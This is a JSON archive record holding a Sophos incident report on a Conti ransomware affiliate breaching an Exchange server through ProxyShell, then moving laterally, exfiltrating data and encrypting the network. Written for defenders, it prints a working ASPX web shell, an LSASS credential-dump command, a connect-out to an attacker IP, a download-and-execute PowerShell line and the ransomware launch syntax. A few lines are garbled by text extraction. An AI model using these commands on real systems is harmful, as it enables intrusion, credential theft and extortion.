{
    "id": "454edf11-d443-4f50-8d4a-35a45849298e",
    "created_at": "2023-01-12T15:09:21.639276Z",
    "updated_at": "2025-03-27T02:13:16.647385Z",
    "deleted_at": null,
    "sha1_hash": "4ff6792d1d3a1e39b5f7e91fb84f08ccc5344814",
    "title": "2021-09-03 - Conti affiliates use ProxyShell Exchange exploit in ransomware attacks",
    "authors": "",
    "file_creation_date": "2022-05-28T01:22:52Z",
    "file_modification_date": "2022-05-28T01:22:52Z",
    "file_size": 1597964,
    "plain_text": "# Conti affiliates use ProxyShell Exchange exploit in ransomware attacks\n\n**[news.sophos.com/en-us/2021/09/03/conti-affiliates-use-proxyshell-exchange-exploit-in-ransomware-attacks/](https://news.sophos.com/en-us/2021/09/03/conti-affiliates-use-proxyshell-exchange-exploit-in-ransomware-attacks/)**\n\nSeptember 3, 2021\n\nAn investigation into recent attacks by a Conti affiliate reveals that that the attackers initially accessed targeted organizations’ networks with\nProxyShell, an exploit of vulnerabilities in Microsoft Exchange that have been the subject of multiple critical updates over the past several\nmonths. The attacker otherwise closely followed the game plan laid out in a recently leaked set of documentation attributed to Conti’s\noperators.\n\n[ProxyShell represents an evolution of the ProxyLogon attack method. In recent months, the exploit has become a mainstay of ransomware](https://news.sophos.com/en-us/2021/08/23/proxyshell-vulnerabilities-in-microsoft-exchange-what-to-do/)\n[attacker playbooks, including those deploying the new LockFile ransomware first seen in July.](https://news.sophos.com/en-us/2021/08/27/lockfile-ransomwares-box-of-tricks-intermittent-encryption-and-evasion/)\n\nAs attackers have gained experience with the techniques, their dwell time before launching the final ransomware payload on target networks\nhas decreased from weeks to days to hours. In the case of one of the group of ProxyShell-based attacks observed by Sophos, the Conti\naffiliates managed to gain access to the target’s network and set up a remote web shell in under a minute. Three minutes later, they installed a\nsecond, backup web shell. Within 30 minutes they had generated a complete list of the network’s computers, domain controllers, and domain\nadministrators. Just four hours later, the Conti affiliates had obtained the credentials of domain administrator accounts and began executing\ncommands.\n\nWithin 48 hours of gaining that initial access, the attackers had exfiltrated about 1 Terabyte of data. After five days had passed, they deployed\nthe Conti ransomware to every machine on the network, specifically targeting individual network shares on each computer. Over the course of\nthe intrusion, the Conti affiliates installed no fewer than seven back doors on the network: two web shells, Cobalt Strike, and four commercial\nremote access tools (AnyDesk, Atera, Splashtop and Remote Utilities). The web shells, installed early on, were used mainly for initial access;\nCobalt Strike and AnyDesk were the primary tools they used for the remainder of the attack.\n\n### Initial compromise\n\nWhile Microsoft has issued fixes that mitigate the vulnerabilities in April and May, those fixes require an upgrade to a recent Exchange Server\ncumulative update—essentially a re-installation of Exchange that results in email downtime. Some organizations using Exchange Server have\nnot yet made that update, leaving them vulnerable to attackers who continuously scan the Internet for vulnerable Exchange servers. In the\ncase analyzed here, the target’s Windows 2012 R2 Standard server had been running Exchange Server 2016 Cumulative Update 3 (CU3). To\n[mitigate against ProxyShell, Exchange 2016 installations need to be updated to at least the CU19 version, released in December, 2020.](https://www.microsoft.com/en-us/download/details.aspx?id=102532)\n\n\n-----\n\nUs g o yS e, t e attac e s c eated a e a bo o ad st ato, a d t e ass g ed e o es to t at a bo us g c oso t\nExchange “cmdlets”—including rights to remotely execute PowerShell commands.\n\n[In another recent Conti ProxyShell attack, the attacker created a mailbox referencing Evil Corp, the organization behind Dridex (as well as a](https://www.bbc.com/news/world-us-canada-53195749)\nfictional company the television show Mr. Robot), as part of the ProxyShell attack:\n\nAfter gaining access through the exploit, the attackers then created a web shell on the localhost address of the server:\n\n**\\\\127.0.0.1\\C$\\inetpub\\wwwroot\\aspnet_client\\aspnetclient_log.aspx**\n\nThree minutes later, the attacker issued the first command through the shell – a PowerShell script, encoded in base64. It was a whoami\ncommand, used to check which account the actors were using for access. (The encoded script, along with the other encoded scripts from this\nincident, is included in the IOCs section at the end of this report.)\n\nThe next encoded command passed is the command line interface to Windows’ Service Control Manager:\n```\nsc -path c:\\inetpub\\wwwroot\\aspnet_client\\test.txt -value (iex('ls c:\\inetpub\\wwwroot\\aspnet_client\\')|Out-String)\n\n```\nThis command abuses Service Control Manager to execute a directory look-up on the directory where the web shell has been dropped, writing\nout the results to a file called test.txt, which can be viewed remotely through the web shell.\n\nNext, they executed another, much larger, encoded PowerShell command. This command is double-obfuscated. Decoding the command itself\nreveals more abuse of Service Control Manager is involved, but there’s also an encoded variable, $a. The script outputs the contents of $a to a\nfile, and checks the contents of the directory afterward to make sure it succeeded. The variable decodes as yet another web shell:\n\n\n-----\n\n```\n&lt;%@ Import Namespace=\"System.Diagnostics\" %>\n<%@ Import Namespace=\"System.IO\" %>\n<%@ Import Namespace=\"System\" %>\n<%@ Import Namespace=\"System.Runtime.Serialization.Formatters.Binary\" %>\n<script runat=\"server\">\nprotected string ExchangeRuntime()\n{\nreturn s.Text.ToString();\n}\nprotected void Database(MemoryStream m,BinaryFormatter b)\n{\nm.Position = 0;\nb.Deserialize(m);\n}\nprotected void C_Click(object sender, EventArgs e)\n{\nByte[] S = System.Convert.FromBase64String(ExchangeRuntime());\nMemoryStream m = new MemoryStream(S);\nBinaryFormatter b = new BinaryFormatter();\nDatabase(m,b);\n}\n</script>\n<html>\n<form id=\"form\" runat=\"server\" >\n<asp:TextBox runat=\"server\" ID=\"s\" Value=\"\" input style=\"border:0px\"/>\n<asp:Button ID=\"C\" runat=\"server\" Text=\"\" OnClick=\"C_Click\" />\n</form>\n</body>\n</html>\n\n```\nThe next PowerShell command uses the text to create an .ASPX file–the new web shell.\n```\nCopy-Item -path c:\\programdata\\a.txt -Destination \"C:\\Program Files\\Microsoft\\Exchange\nServer\\V15\\FrontEnd\\HttpProxy\\owa\\auth\\current\\themes\\ResourceHandler.aspx\" -Force;sc -path\nc:\\inetpub\\wwwroot\\aspnet_client\\test.txt -value (iex('ls \"C:\\Program Files\\Microsoft\\Exchange\nServer\\V15\\FrontEnd\\HttpProxy\\owa\\auth\\current\\themes\\\"')|Out-String)\n\n```\nThe resulting ResourceHandler.aspx is configured to take base64-encoded content via a text box, decode and de-serialize the contents to\nconvert it to binary. This allows encoded binaries to be dropped onto the targeted server.\n\nSo, within the first five minutes, the intruders had established a foothold allowing for initial exploitation of the vulnerable Exchange server.\n\n## Reconnaissance\n\nNext, the Conti affiliates started assessing where they had landed. Another PowerShell command, once again leveraging Service Control\nManager in the same way. Decoded, the command is:\n```\npowershell sc -path \"c:\\programdata\\a.txt\" -value $a -Force;sc -path c:\\inetpub\\wwwroot\\aspnet_client\\test.txt -value (iex('nltest\n/dclist:')|Out-String)\n\n```\nThis overwrites the original dump of the second web shell’s code with an empty file, and then outputs a list of domain controllers to the text file\nused to read the results of these commands. The overwrite is repeated in the next encoded command, which also extract a list of computers\non the domain:\n```\nsc -path \"c:\\programdata\\a.txt\" -value $a -Force;sc -path c:\\inetpub\\wwwroot\\aspnet_client\\test.txt -value (iex('net group \"domain\ncomputers\" /domain')|Out-String)\n\n```\nAfter retrieving the list of domain computers from the text file, the intruders then ran another encoded script that overwrote the text.txt file,\nreplacing it with one with “teset” as the only text. They then shifted to the second web shell and continued reconnaissance, executing a series\nof PowerShell commands using the -noninteractive and -executionpolicy bypass flags to collect information about the network\nconfiguration, domain administrators, users actively connected to the system (with quser), and the process ID of the Local Security Authority\nSubsystem Service (LSASS), if it’s running (with ps lsass).\n\nThe attackers then dropped an executable, SVN.exe (sha1: 59e2d227bf8499d1d28116f922925980774ebf96), and executed it with a\nPowerShell command, establishing a connection to a server in Finland.\n```\npowershell.exe -noninteractive -executionpolicy bypass Start-Process c:\\windows\\SVN.exe -ArgumentList '-connect\n135[.]181[.]10[.]218:443 -pass Password1234'\n\n### Going lateral\n\n```\nAbout four hours after the initial compromise, the attackers were observed stealing credentials—using the COM+ Services DLL’s MiniDump\ninterface to dump the LSASS process located during reconnaissance:\n\n\n-----\n\n```\nC:\\programdata\\a.zip full\n\n```\nJust 13 minutes after the credential dump–at 8 PM local time for the targeted organization– the Conti actors began lateral movement using an\nexisting domain administrator account that they had cracked. That account was used to create an RDP connection from the Exchange server\nto another server. One minute later, the logs of that server show the domain admin account downloading and installing the AnyDesk remote\ndesktop software as a service. Shortly afterward, they began to clean up the files left on the Exchange server, deleting the credentials dump\nand killing and deleting the SVN.exe process via PowerShell.\n\nThe attackers then dropped a Cobalt Strike DLL onto the server running AnyDesk. They were then observed using the ADfind tool to query\nActive Directory data. This tool was part of the recent Conti affiliate tools and tips leak.\n\nFive hours later, we then saw further lateral movement. A Cobalt Strike .dll was seen being deployed to a third server. This server became the\nprimary base of operations for further lateral movement activity by the attackers. Three additional remote access tools (Splashtop, Remote\nUtilities and Atera Networks’ Atera Agent) were deployed on this server, and the server was used for RDP-based lateral movement over the\nnext day, including to domain controllers and backup servers.\n\n### Exfiltration and encryption\n\nOn the third day of the intrusion, we saw evidence of the Rclone file copying utility being deployed to multiple servers. The attackers then\nexecuted a PowerShell file (rclonemanager.ps1) that executes the utility across multiple servers’ drives. Both Rclone and rclonemanager.ps1\nwere part of the recently leaked Conti affiliate playbook\n\nA screen shot of part of the code in\n\nrclonemanager.ps1.\nThis script reads from a pair of files that include the addresses of remote drives to copy to the Mega file sharing service, and the username and\npassword for that account. Traffic was seen for two days going to Mega from the servers Rclone was installed to, with just under 1 TB of data\nexfiltrated.\n\nOn the fifth day since the initial compromise–at about 10 pm local time on a Friday–the Conti actors began deploying ransomware. Four batch\nscripts (called 1help.bat, 2help.bat, 3help.bat and 4help.bat) were run from four servers. The batch files repeatedly invoked the ransomware\nexecutable (x64.exe), with each iteration targeting specific drives on every Windows system on network by their default file sharing names (C$,\nD$, etc.):\n```\nstart C:\\x64.exe -m -net -size 10 -nomutex -p \\\\[computer Active Directory name]\\C$\n\n```\nIn other similar Conti attacks, we have seen the same type of .bat files named [number]start.bat, and ransowmare executables named\nLocker.exe.\n\nEvery Windows system on the network was targeted, meaning that the attackers had scanned and inventoried all of the systems on the\nnetwork to identify their connected drives. Because of the way the batch files executed, the actual ransomware executable (x64.exe) remained\non the four servers. This was a defense evasion tactic; these were specifically servers that had no malware protection installed, where the\nransomware binary could run without detection and encrypt all targeted systems over the network.\n\n### Impact\n\n\n-----\n\nThe attack resulted in a total loss of access to the victim’s data. The pace of the attack shows that this Conti affiliate took time to thoroughly\ndocument the network of the victim before springing the attack, and minimized the opportunities of discovery of the ransomware itself by\nrunning it from servers rather than on each targeted machine.\n\nThe threat posed by ProxyShell and other attacks on known Microsoft Exchange vulnerabilities is extremely high. Organizations with onpremises Exchange Server should update and patch servers as soon as is possible. Additionally, attacks like these demonstrate the need to\nenable malware protection on servers as well as endpoints.\n\nSophos’ Cryptoguard and Credentialguard technologies, as well as behavioral and machine-learning based defenses, would have prevented\nthis sort of attack from succeeding. Sophos Application Control can also be used to prevent the use of remote access tools such as AnyDesk\n\n**SophosLabs would like to acknowledge Anand Ajjan, Andrew Ludgate, and Gabor Szappanos of SophosLabs, and Sergio Bestulic**\n**and Syed Zaidi from Sophos MTR’s Rapid Response Team for their contributions to this report.**\n\n## IOCs\n\nThe encoded PowerShell commands from this attack are provided below for threat researchers and responders:\n\n**PowerShell command #1**\n\npowershell -enc dwBoAG8AYQBtAGkA\n\nDecoded: whoami\n\n**PowerShell command #2**\n\npowershell -enc\ncwBjACAALQBwAGEAdABoACAAYwA6AFwAaQBuAGUAdABwAHUAYgBcAHcAdwB3AHIAbwBvAHQAXABhAHMAcABuAGUAdABfAGMAbABp\n\nDecoded: sc -path c:\\inetpub\\wwwroot\\aspnet_client\\test.txt -value (iex(‘ls c:\\inetpub\\wwwroot\\aspnet_client\\’)|Out-String)\n\n**PowerShell command #3**\n\npowershell -enc\nJABhAD0AIgBQAEMAVgBBAEkARgBCAGgAWgAyAFUAZwBUAEcARgB1AFoAMwBWAGgAWgAyAFUAOQBJAGsATQBqAEkAaQBCAEUAWgB\n\nDecoded:\n\n\n-----\n\n$a C Ug G u 3 U9 j J 0 d J S gd sa dG S 0 SJ S gJ Cj QC Jb c Qg t\n\n[System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($a));sc -path “c:\\programdata\\a.txt” -value $a -Force;sc -path\nc:\\inetpub\\wwwroot\\aspnet_client\\test.txt -value (iex(‘ls c:\\programdata\\’)|Out-String)\n\n**PowerShell command #4**\n\npowershell -enc\nQwBvAHAAeQAtAEkAdABlAG0AIAAtAHAAYQB0AGgAIABjADoAXABwAHIAbwBnAHIAYQBtAGQAYQB0AGEAXABhAC4AdAB4AHQAIAAtAEQA\n\n**PowerShell command #5**\n\npowershell -enc\ncwBjACAALQBwAGEAdABoACAAIgBjADoAXABwAHIAbwBnAHIAYQBtAGQAYQB0AGEAXABhAC4AdAB4AHQAIgAgAC0AdgBhAGwAdQBlACA\n\nDecoded:\n\nsc -path “c:\\programdata\\a.txt” -value $a -Force;sc -path c:\\inetpub\\wwwroot\\aspnet_client\\test.txt -value (iex(‘nltest /dclist:’)|Out-String)\n\n**PowerShell command #6**\n\npowershell -enc\ncwBjACAALQBwAGEAdABoACAAIgBjADoAXABwAHIAbwBnAHIAYQBtAGQAYQB0AGEAXABhAC4AdAB4AHQAIgAgAC0AdgBhAGwAdQBlACA\n\n**PowerShell command #7**\n\npowershell -enc\ncwBjACAALQBwAGEAdABoACAAYwA6AFwAaQBuAGUAdABwAHUAYgBcAHcAdwB3AHIAbwBvAHQAXABhAHMAcABuAGUAdABfAGMAbABp\n\n**Decoded:**\n\n**sc -path c:\\inetpub\\wwwroot\\aspnet_client\\test.txt -value teset**\n\n**PowerShell command #8**\n\npowershell.exe -noninteractive -executionpolicy bypass ipconfig /all\n\n**PowerShell command #9**\n\npowershell.exe -noninteractive -executionpolicy bypass net group ‘domain admins’ /domain\n\n**PowerShell command #10**\n\npowershell.exe -noninteractive -executionpolicy bypass quser\n\n**PowerShell command #11**\n\npowershell.exe -noninteractive -executionpolicy bypass ps lsass\n\n**PowerShell command #12**\n\npowershell.exe -noninteractive -executionpolicy bypass Start-Process c:\\windows\\SVN.exe -ArgumentList ‘-connect 135.181.10.218:443 -pass\nPassword1234’\n\n**PowerShell command #13**\n\npowershell.exe -noninteractive -executionpolicy bypass rundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump 596 C:\\programdata\\a.zip\nfull\n\n**PowerShell command #14**\n\npowershell -nop -exec bypass -EncodedCommand\nSQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAGMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAG\n\nDecoded:\n\nIEX (New-Object Net.Webclient).DownloadString(‘http://127.0.0.1:20412/’); .\\rclonemanager.ps1\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2021/2021-09-03 - Conti affiliates use ProxyShell Exchange exploit in ransomware attacks.pdf"
    ],
    "report_names": [
        "2021-09-03 - Conti affiliates use ProxyShell Exchange exploit in ransomware attacks.pdf"
    ],
    "threat_actors": [
        {
            "id": "6c4f98b3-fe14-42d6-beaa-866395455e52",
            "created_at": "2023-01-06T13:46:39.169554Z",
            "updated_at": "2025-03-27T02:00:03.011739Z",
            "deleted_at": null,
            "main_name": "Evil Corp",
            "aliases": [
                "GOLD DRAKE"
            ],
            "source_name": "MISPGALAXY:Evil Corp",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "610a7295-3139-4f34-8cec-b3da40add480",
            "created_at": "2023-01-06T13:46:38.608142Z",
            "updated_at": "2025-03-27T02:00:02.87217Z",
            "deleted_at": null,
            "main_name": "Cobalt",
            "aliases": [
                "Cobalt Gang",
                "GOLD KINGSWOOD",
                "COBALT SPIDER",
                "G0080",
                "Mule Libra",
                "Cobalt Group"
            ],
            "source_name": "MISPGALAXY:Cobalt",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "50068c14-343c-4491-b568-df41dd59551c",
            "created_at": "2022-10-25T15:50:23.253218Z",
            "updated_at": "2025-03-27T02:00:55.408128Z",
            "deleted_at": null,
            "main_name": "Indrik Spider",
            "aliases": [
                "Indrik Spider",
                "Evil Corp",
                "Manatee Tempest",
                "DEV-0243",
                "UNC2165"
            ],
            "source_name": "MITRE:Indrik Spider",
            "tools": [
                "Mimikatz",
                "PsExec",
                "Dridex",
                "WastedLocker",
                "BitPaymer",
                "Cobalt Strike"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "9806f226-935f-48eb-b138-6616c9bb9d69",
            "created_at": "2022-10-25T16:07:23.73153Z",
            "updated_at": "2025-03-27T02:02:09.950784Z",
            "deleted_at": null,
            "main_name": "Indrik Spider",
            "aliases": [
                "Blue Lelantos",
                "DEV-0243",
                "Evil Corp",
                "Gold Drake",
                "Gold Winter",
                "Manatee Tempest",
                "UNC2165"
            ],
            "source_name": "ETDA:Indrik Spider",
            "tools": [
                "Advanced Port Scanner",
                "Agentemis",
                "Babuk",
                "Babuk Locker",
                "Babyk",
                "BitPaymer",
                "Bugat",
                "Bugat v5",
                "Cobalt Strike",
                "CobaltStrike",
                "Cridex",
                "Dridex",
                "EmPyre",
                "EmpireProject",
                "FAKEUPDATES",
                "FakeUpdate",
                "Feodo",
                "FriedEx",
                "Hades",
                "IEncrypt",
                "LINK_MSIEXEC",
                "MEGAsync",
                "Macaw Locker",
                "Metasploit",
                "Mimikatz",
                "PayloadBIN",
                "Phoenix Locker",
                "PowerShell Empire",
                "PowerSploit",
                "PsExec",
                "QNAP-Worm",
                "Raspberry Robin",
                "RaspberryRobin",
                "SocGholish",
                "Vasa Locker",
                "WastedLoader",
                "WastedLocker",
                "cobeacon",
                "wp_encrypt"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "b296f34c-c424-41da-98bf-90312a5df8ef",
            "created_at": "2024-06-19T02:03:08.027585Z",
            "updated_at": "2025-03-27T02:05:17.350153Z",
            "deleted_at": null,
            "main_name": "GOLD DRAKE",
            "aliases": [
                "Indrik Spider ",
                "Evil Corp"
            ],
            "source_name": "Secureworks:GOLD DRAKE",
            "tools": [
                " Cobalt Strike",
                " Covenant",
                " Donut",
                " Dridex",
                " Hades",
                " Koadic",
                " LockBit",
                " Macaw Locker",
                " Mimikatz",
                " Payload.Bin",
                " Phoenix CryptoLocker",
                " PowerSploit",
                " Powershell Empire",
                " SocGholish",
                " WastedLocker",
                "BitPaymer"
            ],
            "source_id": "Secureworks",
            "reports": null
        }
    ],
    "ts_created_at": 1673536161,
    "ts_updated_at": 1743041596,
    "ts_creation_date": 1653700972,
    "ts_modification_date": 1653700972,
    "files": {
        "pdf": "https://archive.orkl.eu/4ff6792d1d3a1e39b5f7e91fb84f08ccc5344814.pdf",
        "text": "https://archive.orkl.eu/4ff6792d1d3a1e39b5f7e91fb84f08ccc5344814.txt",
        "img": "https://archive.orkl.eu/4ff6792d1d3a1e39b5f7e91fb84f08ccc5344814.jpg"
    }
}